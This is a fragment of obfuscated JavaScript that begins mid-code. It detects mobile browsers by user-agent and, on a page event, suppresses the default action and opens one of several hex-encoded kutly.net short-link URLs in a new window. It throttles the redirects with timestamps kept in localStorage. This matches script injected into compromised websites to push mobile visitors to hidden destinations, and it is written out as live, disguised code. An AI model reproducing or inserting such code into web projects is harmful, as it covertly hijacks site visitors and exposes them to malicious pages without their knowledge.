_0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());